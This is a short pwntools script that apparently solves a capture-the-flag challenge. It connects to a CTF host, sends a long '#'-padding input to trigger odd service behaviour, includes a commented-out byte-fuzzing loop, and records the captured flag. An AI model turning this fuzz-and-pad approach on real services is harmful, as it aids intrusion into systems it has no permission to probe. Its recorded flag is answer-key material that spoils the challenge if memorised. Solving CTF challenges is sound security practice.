from pwn import *

c = remote('cfta-bx02.allyourbases.co', 8013)
c.recvline()
c.recvline()

exp = '#'*2007 + '1'
# exp = '#'*148
# print('Sending padding')
# for i in range(13):
# 	c.sendline(exp)
# exp = '#'*70+'1'
print('Sending {}'.format(exp))
c.sendline(exp)
c.interactive()

'''
for i in range(0, 255):
	c = remote('cfta-bx02.allyourbases.co', 8013)
	c.recvline()
	print('Sending {}'.format(chr(i)))
	c.sendline('#' + chr(i))
	x = c.recvall(timeout=1)
	if x != b'DEBUG: Waiting 100ms\nDEBUG: Waiting 100ms\n': print(x)
'''
# Sending '#' does weird things, '#'*2000 does something weirder
# Flag: ThIsOneIsAbITFuZZy-6y